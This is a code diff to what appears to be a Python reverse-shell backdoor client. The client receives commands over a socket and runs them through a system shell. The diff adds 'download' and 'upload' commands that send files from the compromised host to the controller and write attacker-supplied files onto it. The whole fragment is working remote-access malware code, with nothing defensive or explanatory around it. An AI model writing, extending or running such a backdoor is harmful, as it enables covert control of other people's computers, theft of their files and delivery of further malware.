@@ -32,6 +32,25 @@ def connection():
             connection()
 
 
+def download_file(filename):
+    f = open(filename, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        try:
+            f.write(chunk)
+            chunk = s.recv(1024)
+        except socket.timeout:
+            break
+    s.settimeout(None)
+    f.close()
+
+
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    s.send(f.read())
+
+
 def shell():
     while True:
         command = reliable_recv()
@@ -41,6 +60,10 @@ def shell():
             os.chdir(command[3:])
         elif command == 'clear':
             pass
+        elif command[:9] == 'download ':
+            upload_file(command[9:])
+        elif command[:7] == 'upload ':
+            download_file(command[7:])
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
